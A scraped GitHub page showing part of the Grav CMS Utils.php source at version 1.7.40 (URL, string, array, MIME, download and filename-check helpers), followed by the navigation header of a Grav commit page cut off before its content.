=== Content from github.com_4f8b8297_20250115_091037.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2F1.7.40%2Fsystem%2Fsrc%2FGrav%2FCommon%2FUtils.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2F1.7.40%2Fsystem%2Fsrc%2FGrav%2FCommon%2FUtils.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav/tree/1.7.40)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav/tree/1.7.40)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

## Files

 1.7.40
## Breadcrumbs

1. [grav](/getgrav/grav/tree/1.7.40)
2. /[system](/getgrav/grav/tree/1.7.40/system)
3. /[src](/getgrav/grav/tree/1.7.40/system/src)
4. /[Grav](/getgrav/grav/tree/1.7.40/system/src/Grav)
5. /[Common](/getgrav/grav/tree/1.7.40/system/src/Grav/Common)
/
# Utils.php

Copy path Blame  Blame
## Latest commit

## History

[History](/getgrav/grav/commits/1.7.40/system/src/Grav/Common/Utils.php)2191 lines (1911 loc) · 63.8 KB 1.7.40
## Breadcrumbs

1. [grav](/getgrav/grav/tree/1.7.40)
2. /[system](/getgrav/grav/tree/1.7.40/system)
3. /[src](/getgrav/grav/tree/1.7.40/system/src)
4. /[Grav](/getgrav/grav/tree/1.7.40/system/src/Grav)
5. /[Common](/getgrav/grav/tree/1.7.40/system/src/Grav/Common)
/
# Utils.php

Top
## File metadata and controls

* Code
* Blame

2191 lines (1911 loc) · 63.8 KB[Raw](https://github.com/getgrav/grav/raw/refs/tags/1.7.40/system/src/Grav/Common/Utils.php)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000<?php
/\*\* \* @package Grav\Common \* \* @copyright Copyright (c) 2015 - 2023 Trilby Media, LLC. All rights reserved. \* @license MIT License; see LICENSE file for details. \*/
namespace Grav\Common;
use DateTime;use DateTimeZone;use Exception;use Grav\Common\Flex\Types\Pages\PageObject;use Grav\Common\Helpers\Truncator;use Grav\Common\Page\Interfaces\PageInterface;use Grav\Common\Markdown\Parsedown;use Grav\Common\Markdown\ParsedownExtra;use Grav\Common\Page\Markdown\Excerpts;use Grav\Common\Page\Pages;use Grav\Framework\Flex\Flex;use Grav\Framework\Flex\Interfaces\FlexObjectInterface;use Grav\Framework\Media\Interfaces\MediaInterface;use InvalidArgumentException;use Negotiation\Accept;use Negotiation\Negotiator;use RocketTheme\Toolbox\Event\Event;use RocketTheme\Toolbox\ResourceLocator\UniformResourceLocator;use RuntimeException;use function array\_key\_exists;use function array\_slice;use function count;use function extension\_loaded;use function function\_exists;use function in\_array;use function is\_array;use function is\_callable;use function is\_string;use function strlen;
/\*\* \* Class Utils \* @package Grav\Common \*/abstract class Utils{ /\*\* @var array \*/ protected static $nonces = [];
 protected const ROOTURL\_REGEX = '{^((?:http[s]?:\/\/[^\/]+)|(?:\/\/[^\/]+))(.\*)}';
 // ^((?:http[s]?:)?[\/]?(?:\/))
 /\*\* \* Simple helper method to make getting a Grav URL easier \* \* @param string|object $input \* @param bool $domain \* @param bool $fail\_gracefully \* @return string|false \*/ public static function url($input, $domain = false, $fail\_gracefully = false) { if ((!is\_string($input) && !is\_callable([$input, '\_\_toString'])) || !trim($input)) { if ($fail\_gracefully) { $input = '/'; } else { return false; } }
 $input = (string)$input;
 if (Uri::isExternal($input)) { return $input; }
 $grav = Grav::instance();
 /\*\* @var Uri $uri \*/ $uri = $grav['uri'];
 $resource = false; if (static::contains((string)$input, '://')) { // Url contains a scheme (https:// , user:// etc). /\*\* @var UniformResourceLocator $locator \*/ $locator = $grav['locator'];
 $parts = Uri::parseUrl($input);
 if (is\_array($parts)) { // Make sure we always have scheme, host, port and path. $scheme = $parts['scheme'] ?? ''; $host = $parts['host'] ?? ''; $port = $parts['port'] ?? ''; $path = $parts['path'] ?? '';
 if ($scheme && !$port) { // If URL has a scheme, we need to check if it's one of Grav streams. if (!$locator->schemeExists($scheme)) { // If scheme does not exists as a stream, assume it's external. return str\_replace(' ', '%20', $input); }
 // Attempt to find the resource (because of parse\_url() we need to put host back to path). $resource = $locator->findResource("{$scheme}://{$host}{$path}", false);
 if ($resource === false) { if (!$fail\_gracefully) { return false; }
 // Return location where the file would be if it was saved. $resource = $locator->findResource("{$scheme}://{$host}{$path}", false, true); } } elseif ($host || $port) { // If URL doesn't have scheme but has host or port, it is external. return str\_replace(' ', '%20', $input); }
 if (!empty($resource)) { // Add query string back. if (isset($parts['query'])) { $resource .= '?' . $parts['query']; }
 // Add fragment back. if (isset($parts['fragment'])) { $resource .= '#' . $parts['fragment']; } } } else { // Not a valid URL (can still be a stream). $resource = $locator->findResource($input, false); } } else { // Just a path. /\*\* @var Pages $pages \*/ $pages = $grav['pages'];
 // Is this a page? $page = $pages->find($input, true); if ($page && $page->routable()) { return $page->url($domain); }
 $root = preg\_quote($uri->rootUrl(), '#'); $pattern = '#(' . $root . '$|' . $root . '/)#'; if (!empty($root) && preg\_match($pattern, $input, $matches)) { $input = static::replaceFirstOccurrence($matches[0], '', $input); }
 $input = ltrim($input, '/'); $resource = $input; }
 if (!$fail\_gracefully && $resource === false) { return false; }
 $domain = $domain ?: $grav['config']->get('system.absolute\_urls', false);
 return rtrim($uri->rootUrl($domain), '/') . '/' . ($resource ?: ''); }
 /\*\* \* Helper method to find the full path to a file, be it a stream, a relative path, or \* already a full path \* \* @param string $path \* @return string \*/ public static function fullPath($path) { $locator = Grav::instance()['locator'];
 if ($locator->isStream($path)) { $path = $locator->findResource($path, true); } elseif (!static::startsWith($path, GRAV\_ROOT)) { $base\_url = Grav::instance()['base\_url']; $path = GRAV\_ROOT . '/' . ltrim(static::replaceFirstOccurrence($base\_url, '', $path), '/'); }
 return $path; }
 /\*\* \* Check if the $haystack string starts with the substring $needle \* \* @param string $haystack \* @param string|string[] $needle \* @param bool $case\_sensitive \* @return bool \*/ public static function startsWith($haystack, $needle, $case\_sensitive = true) { $status = false;
 $compare\_func = $case\_sensitive ? 'mb\_strpos' : 'mb\_stripos';
 foreach ((array)$needle as $each\_needle) { $status = $each\_needle === '' || $compare\_func($haystack, $each\_needle) === 0; if ($status) { break; } }
 return $status; }
 /\*\* \* Check if the $haystack string ends with the substring $needle \* \* @param string $haystack \* @param string|string[] $needle \* @param bool $case\_sensitive \* @return bool \*/ public static function endsWith($haystack, $needle, $case\_sensitive = true) { $status = false;
 $compare\_func = $case\_sensitive ? 'mb\_strrpos' : 'mb\_strripos';
 foreach ((array)$needle as $each\_needle) { $expectedPosition = mb\_strlen($haystack) - mb\_strlen($each\_needle); $status = $each\_needle === '' || $compare\_func($haystack, $each\_needle, 0) === $expectedPosition; if ($status) { break; } }
 return $status; }
 /\*\* \* Check if the $haystack string contains the substring $needle \* \* @param string $haystack \* @param string|string[] $needle \* @param bool $case\_sensitive \* @return bool \*/ public static function contains($haystack, $needle, $case\_sensitive = true) { $status = false;
 $compare\_func = $case\_sensitive ? 'mb\_strpos' : 'mb\_stripos';
 foreach ((array)$needle as $each\_needle) { $status = $each\_needle === '' || $compare\_func($haystack, $each\_needle) !== false; if ($status) { break; } }
 return $status; }
 /\*\* \* Function that can match wildcards \* \* match\_wildcard('foo\*', $test), // TRUE \* match\_wildcard('bar\*', $test), // FALSE \* match\_wildcard('\*bar\*', $test), // TRUE \* match\_wildcard('\*\*blob\*\*', $test), // TRUE \* match\_wildcard('\*a?d\*', $test), // TRUE \* match\_wildcard('\*etc\*\*', $test) // TRUE \* \* @param string $wildcard\_pattern \* @param string $haystack \* @return false|int \*/ public static function matchWildcard($wildcard\_pattern, $haystack) { $regex = str\_replace( array("\\*", "\?"), // wildcard chars array('.\*', '.'), // regexp chars preg\_quote($wildcard\_pattern, '/') );
 return preg\_match('/^' . $regex . '$/is', $haystack); }
 /\*\* \* Render simple template filling up the variables in it. If value is not defined, leave it as it was. \* \* @param string $template Template string \* @param array $variables Variables with values \* @param array $brackets Optional array of opening and closing brackets or symbols \* @return string Final string filled with values \*/ public static function simpleTemplate(string $template, array $variables, array $brackets = ['{', '}']): string { $opening = $brackets[0] ?? '{'; $closing = $brackets[1] ?? '}'; $expression = '/' . preg\_quote($opening, '/') . '(.\*?)' . preg\_quote($closing, '/') . '/'; $callback = static function ($match) use ($variables) { return $variables[$match[1]] ?? $match[0]; };
 return preg\_replace\_callback($expression, $callback, $template); }
 /\*\* \* Returns the substring of a string up to a specified needle. if not found, return the whole haystack \* \* @param string $haystack \* @param string $needle \* @param bool $case\_sensitive \* \* @return string \*/ public static function substrToString($haystack, $needle, $case\_sensitive = true) { $compare\_func = $case\_sensitive ? 'mb\_strpos' : 'mb\_stripos';
 if (static::contains($haystack, $needle, $case\_sensitive)) { return mb\_substr($haystack, 0, $compare\_func($haystack, $needle, $case\_sensitive)); }
 return $haystack; }
 /\*\* \* Utility method to replace only the first occurrence in a string \* \* @param string $search \* @param string $replace \* @param string $subject \* \* @return string \*/ public static function replaceFirstOccurrence($search, $replace, $subject) { if (!$search) { return $subject; }
 $pos = mb\_strpos($subject, $search); if ($pos !== false) { $subject = static::mb\_substr\_replace($subject, $replace, $pos, mb\_strlen($search)); }
 return $subject; }
 /\*\* \* Utility method to replace only the last occurrence in a string \* \* @param string $search \* @param string $replace \* @param string $subject \* @return string \*/ public static function replaceLastOccurrence($search, $replace, $subject) { $pos = strrpos($subject, $search);
 if ($pos !== false) { $subject = static::mb\_substr\_replace($subject, $replace, $pos, mb\_strlen($search)); }
 return $subject; }
 /\*\* \* Multibyte compatible substr\_replace \* \* @param string $original \* @param string $replacement \* @param int $position \* @param int $length \* @return string \*/ public static function mb\_substr\_replace($original, $replacement, $position, $length) { $startString = mb\_substr($original, 0, $position, 'UTF-8'); $endString = mb\_substr($original, $position + $length, mb\_strlen($original), 'UTF-8');
 return $startString . $replacement . $endString; }
 /\*\* \* Merge two objects into one. \* \* @param object $obj1 \* @param object $obj2 \* \* @return object \*/ public static function mergeObjects($obj1, $obj2) { return (object)array\_merge((array)$obj1, (array)$obj2); }
 /\*\* \* @param array $array \* @return bool \*/ public static function isAssoc(array $array) { return (array\_values($array) !== $array); }
 /\*\* \* Lowercase an entire array. Useful when combined with `in\_array()` \* \* @param array $a \* @return array|false \*/ public static function arrayLower(array $a) { return array\_map('mb\_strtolower', $a); }
 /\*\* \* Simple function to remove item/s in an array by value \* \* @param array $search \* @param string|array $value \* @return array \*/ public static function arrayRemoveValue(array $search, $value) { foreach ((array)$value as $val) { $key = array\_search($val, $search); if ($key !== false) { unset($search[$key]); } } return $search; }
 /\*\* \* Recursive Merge with uniqueness \* \* @param array $array1 \* @param array $array2 \* @return array \*/ public static function arrayMergeRecursiveUnique($array1, $array2) { if (empty($array1)) { // Optimize the base case return $array2; }
 foreach ($array2 as $key => $value) { if (is\_array($value) && isset($array1[$key]) && is\_array($array1[$key])) { $value = static::arrayMergeRecursiveUnique($array1[$key], $value); } $array1[$key] = $value; }
 return $array1; }
 /\*\* \* Returns an array with the differences between $array1 and $array2 \* \* @param array $array1 \* @param array $array2 \* @return array \*/ public static function arrayDiffMultidimensional($array1, $array2) { $result = array(); foreach ($array1 as $key => $value) { if (!is\_array($array2) || !array\_key\_exists($key, $array2)) { $result[$key] = $value; continue; } if (is\_array($value)) { $recursiveArrayDiff = static::ArrayDiffMultidimensional($value, $array2[$key]); if (count($recursiveArrayDiff)) { $result[$key] = $recursiveArrayDiff; } continue; } if ($value != $array2[$key]) { $result[$key] = $value; } }
 return $result; }
 /\*\* \* Array combine but supports different array lengths \* \* @param array $arr1 \* @param array $arr2 \* @return array|false \*/ public static function arrayCombine($arr1, $arr2) { $count = min(count($arr1), count($arr2));
 return array\_combine(array\_slice($arr1, 0, $count), array\_slice($arr2, 0, $count)); }
 /\*\* \* Array is associative or not \* \* @param array $arr \* @return bool \*/ public static function arrayIsAssociative($arr) { if ([] === $arr) { return false; }
 return array\_keys($arr) !== range(0, count($arr) - 1); }
 /\*\* \* Return the Grav date formats allowed \* \* @return array \*/ public static function dateFormats() { $now = new DateTime();
 $date\_formats = [ 'd-m-Y H:i' => 'd-m-Y H:i (e.g. ' . $now->format('d-m-Y H:i') . ')', 'Y-m-d H:i' => 'Y-m-d H:i (e.g. ' . $now->format('Y-m-d H:i') . ')', 'm/d/Y h:i a' => 'm/d/Y h:i a (e.g. ' . $now->format('m/d/Y h:i a') . ')', 'H:i d-m-Y' => 'H:i d-m-Y (e.g. ' . $now->format('H:i d-m-Y') . ')', 'h:i a m/d/Y' => 'h:i a m/d/Y (e.g. ' . $now->format('h:i a m/d/Y') . ')', ]; $default\_format = Grav::instance()['config']->get('system.pages.dateformat.default'); if ($default\_format) { $date\_formats = array\_merge([$default\_format => $default\_format . ' (e.g. ' . $now->format($default\_format) . ')'], $date\_formats); }
 return $date\_formats; }
 /\*\* \* Get current date/time \* \* @param string|null $default\_format \* @return string \* @throws Exception \*/ public static function dateNow($default\_format = null) { $now = new DateTime();
 if (null === $default\_format) { $default\_format = Grav::instance()['config']->get('system.pages.dateformat.default'); }
 return $now->format($default\_format); }
 /\*\* \* Truncate text by number of characters but can cut off words. \* \* @param string $string \* @param int $limit Max number of characters. \* @param bool $up\_to\_break truncate up to breakpoint after char count \* @param string $break Break point. \* @param string $pad Appended padding to the end of the string. \* @return string \*/ public static function truncate($string, $limit = 150, $up\_to\_break = false, $break = ' ', $pad = '&hellip;') { // return with no change if string is shorter than $limit if (mb\_strlen($string) <= $limit) { return $string; }
 // is $break present between $limit and the end of the string? if ($up\_to\_break && false !== ($breakpoint = mb\_strpos($string, $break, $limit))) { if ($breakpoint < mb\_strlen($string) - 1) { $string = mb\_substr($string, 0, $breakpoint) . $pad; } } else { $string = mb\_substr($string, 0, $limit) . $pad; }
 return $string; }
 /\*\* \* Truncate text by number of characters in a "word-safe" manor. \* \* @param string $string \* @param int $limit \* @return string \*/ public static function safeTruncate($string, $limit = 150) { return static::truncate($string, $limit, true); }
 /\*\* \* Truncate HTML by number of characters. not "word-safe"! \* \* @param string $text \* @param int $length in characters \* @param string $ellipsis \* @return string \*/ public static function truncateHtml($text, $length = 100, $ellipsis = '...') { return Truncator::truncateLetters($text, $length, $ellipsis); }
 /\*\* \* Truncate HTML by number of characters in a "word-safe" manor. \* \* @param string $text \* @param int $length in words \* @param string $ellipsis \* @return string \*/ public static function safeTruncateHtml($text, $length = 25, $ellipsis = '...') { return Truncator::truncateWords($text, $length, $ellipsis); }
 /\*\* \* Generate a random string of a given length \* \* @param int $length \* @return string \*/ public static function generateRandomString($length = 5) { return substr(str\_shuffle('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, $length); }
 /\*\* \* Generates a random string with configurable length, prefix and suffix. \* Unlike the built-in `uniqid()`, this string is non-conflicting and safe \* \* @param int $length \* @param array $options \* @return string \* @throws Exception \*/ public static function uniqueId(int $length = 13, array $options = []): string { $options = array\_merge(['prefix' => '', 'suffix' => ''], $options); $bytes = random\_bytes(ceil($length / 2));
 return $options['prefix'] . substr(bin2hex($bytes), 0, $length) . $options['suffix']; }
 /\*\* \* Provides the ability to download a file to the browser \* \* @param string $file the full path to the file to be downloaded \* @param bool $force\_download as opposed to letting browser choose if to download or render \* @param int $sec Throttling, try 0.1 for some speed throttling of downloads \* @param int $bytes Size of chunks to send in bytes. Default is 1024 \* @param array $options Extra options: [mime, download\_name, expires] \* @throws Exception \*/ public static function download($file, $force\_download = true, $sec = 0, $bytes = 1024, array $options = []) { $grav = Grav::instance();
 if (file\_exists($file)) { // fire download event $grav->fireEvent('onBeforeDownload', new Event(['file' => $file, 'options' => &$options]));
 $file\_parts = static::pathinfo($file); $mimetype = $options['mime'] ?? static::getMimeByExtension($file\_parts['extension']); $size = filesize($file); // File size
 $grav->cleanOutputBuffers();
 // required for IE, otherwise Content-Disposition may be ignored if (ini\_get('zlib.output\_compression')) { ini\_set('zlib.output\_compression', 'Off'); }
 header('Content-Type: ' . $mimetype); header('Accept-Ranges: bytes');
 if ($force\_download) { // output the regular HTTP headers header('Content-Disposition: attachment; filename="' . ($options['download\_name'] ?? $file\_parts['basename']) . '"'); }
 // multipart-download and download resuming support if (isset($\_SERVER['HTTP\_RANGE'])) { [$a, $range] = explode('=', $\_SERVER['HTTP\_RANGE'], 2); [$range] = explode(',', $range, 2); [$range, $range\_end] = explode('-', $range); $range = (int)$range; if (!$range\_end) { $range\_end = $size - 1; } else { $range\_end = (int)$range\_end; } $new\_length = $range\_end - $range + 1; header('HTTP/1.1 206 Partial Content'); header("Content-Length: {$new\_length}"); header("Content-Range: bytes {$range}-{$range\_end}/{$size}"); } else { $range = 0; $new\_length = $size; header('Content-Length: ' . $size);
 if ($grav['config']->get('system.cache.enabled')) { $expires = $options['expires'] ?? $grav['config']->get('system.pages.expires'); if ($expires > 0) { $expires\_date = gmdate('D, d M Y H:i:s T', time() + $expires); header('Cache-Control: max-age=' . $expires); header('Expires: ' . $expires\_date); header('Pragma: cache'); } header('Last-Modified: ' . gmdate('D, d M Y H:i:s T', filemtime($file)));
 // Return 304 Not Modified if the file is already cached in the browser if (isset($\_SERVER['HTTP\_IF\_MODIFIED\_SINCE']) && strtotime($\_SERVER['HTTP\_IF\_MODIFIED\_SINCE']) >= filemtime($file)) { header('HTTP/1.1 304 Not Modified'); exit(); } } }
 /\* output the file itself \*/ $chunksize = $bytes \* 8; //you may want to change this $bytes\_send = 0;
 $fp = @fopen($file, 'rb'); if ($fp) { if ($range) { fseek($fp, $range); } while (!feof($fp) && (!connection\_aborted()) && ($bytes\_send < $new\_length)) { $buffer = fread($fp, $chunksize); echo($buffer); //echo($buffer); // is also possible flush(); usleep($sec \* 1000000); $bytes\_send += strlen($buffer); } fclose($fp); } else { throw new RuntimeException('Error - can not open file.'); }
 exit; } }
 /\*\* \* Returns the output render format, usually the extension provided in the URL. (e.g. `html`, `json`, `xml`, etc). \* \* @return string \*/ public static function getPageFormat(): string { /\*\* @var Uri $uri \*/ $uri = Grav::instance()['uri'];
 // Set from uri extension $uri\_extension = $uri->extension(); if (is\_string($uri\_extension) && $uri->isValidExtension($uri\_extension)) { return ($uri\_extension); }
 // Use content negotiation via the `accept:` header $http\_accept = $\_SERVER['HTTP\_ACCEPT'] ?? null; if (is\_string($http\_accept)) { $negotiator = new Negotiator();
 $supported\_types = static::getSupportPageTypes(['html', 'json']); $priorities = static::getMimeTypes($supported\_types);
 $media\_type = $negotiator->getBest($http\_accept, $priorities); $mimetype = $media\_type instanceof Accept ? $media\_type->getValue() : '';
 return static::getExtensionByMime($mimetype); }
 return 'html'; }
 /\*\* \* Return the mimetype based on filename extension \* \* @param string $extension Extension of file (eg "txt") \* @param string $default \* @return string \*/ public static function getMimeByExtension($extension, $default = 'application/octet-stream') { $extension = strtolower($extension);
 // look for some standard types switch ($extension) { case null: return $default; case 'json': return 'application/json'; case 'html': return 'text/html'; case 'atom': return 'application/atom+xml'; case 'rss': return 'application/rss+xml'; case 'xml': return 'application/xml'; }
 $media\_types = Grav::instance()['config']->get('media.types');
 return $media\_types[$extension]['mime'] ?? $default; }
 /\*\* \* Get all the mimetypes for an array of extensions \* \* @param array $extensions \* @return array \*/ public static function getMimeTypes(array $extensions) { $mimetypes = []; foreach ($extensions as $extension) { $mimetype = static::getMimeByExtension($extension, false); if ($mimetype && !in\_array($mimetype, $mimetypes)) { $mimetypes[] = $mimetype; } } return $mimetypes; }
 /\*\* \* Return all extensions for given mimetype. The first extension is the default one. \* \* @param string $mime Mime type (eg 'image/jpeg') \* @return string[] List of extensions eg. ['jpg', 'jpe', 'jpeg'] \*/ public static function getExtensionsByMime($mime) { $mime = strtolower($mime);
 $media\_types = (array)Grav::instance()['config']->get('media.types');
 $list = []; foreach ($media\_types as $extension => $type) { if ($extension === '' || $extension === 'defaults') { continue; }
 if (isset($type['mime']) && $type['mime'] === $mime) { $list[] = $extension; } }
 return $list; }
 /\*\* \* Return the mimetype based on filename extension \* \* @param string $mime mime type (eg "text/html") \* @param string $default default value \* @return string \*/ public static function getExtensionByMime($mime, $default = 'html') { $mime = strtolower($mime);
 // look for some standard mime types switch ($mime) { case '\*/\*': case 'text/\*': case 'text/html': return 'html'; case 'application/json': return 'json'; case 'application/atom+xml': return 'atom'; case 'application/rss+xml': return 'rss'; case 'application/xml': return 'xml'; }
 $media\_types = (array)Grav::instance()['config']->get('media.types');
 foreach ($media\_types as $extension => $type) { if ($extension === 'defaults') { continue; } if (isset($type['mime']) && $type['mime'] === $mime) { return $extension; } }
 return $default; }
 /\*\* \* Get all the extensions for an array of mimetypes \* \* @param array $mimetypes \* @return array \*/ public static function getExtensions(array $mimetypes) { $extensions = []; foreach ($mimetypes as $mimetype) { $extension = static::getExtensionByMime($mimetype, false); if ($extension && !in\_array($extension, $extensions, true)) { $extensions[] = $extension; } }
 return $extensions; }
 /\*\* \* Return the mimetype based on filename \* \* @param string $filename Filename or path to file \* @param string $default default value \* @return string \*/ public static function getMimeByFilename($filename, $default = 'application/octet-stream') { return static::getMimeByExtension(static::pathinfo($filename, PATHINFO\_EXTENSION), $default); }
 /\*\* \* Return the mimetype based on existing local file \* \* @param string $filename Path to the file \* @param string $default \* @return string|bool \*/ public static function getMimeByLocalFile($filename, $default = 'application/octet-stream') { $type = false;
 // For local files we can detect type by the file content. if (!stream\_is\_local($filename) || !file\_exists($filename)) { return false; }
 // Prefer using finfo if it exists. if (extension\_loaded('fileinfo')) { $finfo = finfo\_open(FILEINFO\_SYMLINK | FILEINFO\_MIME\_TYPE); $type = finfo\_file($finfo, $filename); finfo\_close($finfo); } else { // Fall back to use getimagesize() if it is available (not recommended, but better than nothing) $info = @getimagesize($filename); if ($info) { $type = $info['mime']; } }
 return $type ?: static::getMimeByFilename($filename, $default); }
 /\*\* \* Returns true if filename is considered safe. \* \* @param string $filename \* @return bool \*/ public static function checkFilename($filename) { $dangerous\_extensions = Grav::instance()['config']->get('security.uploads\_dangerous\_extensions', []); $extension = static::pathinfo($filename, PATHINFO\_EXTENSION);
 return !( // Empty filenames are not allowed. !$filename // Filename should not contain horizontal/vertical tabs, newlines, nils or back/forward slashes. || strtr($filename, "\t\v\n\r\0\\/", '\_\_\_\_\_\_\_') !== $filename // Filename should not start or end with dot or space. || trim($filename, '. ') !== $filename // File extension should not be part of configured dangerous extensions || in\_array($extension, $dangerous\_extensions) ); }
 /\*\* \* Unicode-safe version of PHP’s pathinfo() function. \* \* @link https://www.php.net/manual/en/function.pathinfo.php[View remainder of file in raw view](https://github.com/getgrav/grav/raw/refs/tags/1.7.40/system/src/Grav/Common/Utils.php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8a1613b7_20250115_091039.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F244758d4383034fe4cd292d41e477177870b65ec)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
